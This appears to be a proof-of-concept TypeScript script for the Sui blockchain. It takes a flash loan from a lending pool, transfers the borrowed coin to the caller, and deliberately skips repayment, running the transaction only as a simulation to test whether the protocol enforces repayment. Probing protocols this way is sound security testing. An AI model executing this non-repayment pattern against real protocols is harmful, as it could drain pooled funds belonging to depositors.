import { SuiClient, getFullnodeUrl } from '@mysten/sui.js/client';
import { Transaction } from '@mysten/sui.js/transactions';

const client = new SuiClient({ url: getFullnodeUrl('mainnet') });

// Fill these before running
const params = {
  pkgLending: '',           // e.g., '0x81c4...'
  configId: '',             // flash_loan::Config object id
  poolId: '',               // pool::Pool<T> object id
  coinType: '0x2::sui::SUI',// or another supported coin type
  amount: '1',              // tiny amount
  sender: '',               // your address
};

async function main() {
  const tx = new Transaction();

  const [balance, receipt] = tx.moveCall({
    target: `${params.pkgLending}::lending::flash_loan_with_ctx`,
    typeArguments: [params.coinType],
    arguments: [tx.object(params.configId), tx.object(params.poolId), tx.pure.u64(params.amount)],
  });

  const coin = tx.moveCall({
    target: '0x2::coin::from_balance',
    typeArguments: [params.coinType],
    arguments: [balance],
  });
  tx.transferObjects([coin], tx.pure.address(params.sender));

  // Intentionally omit repay and omit using `receipt`
  const res = await client.devInspectTransactionBlock({ sender: params.sender, transactionBlock: tx });
  console.dir(res.effects, { depth: null });
}

main();

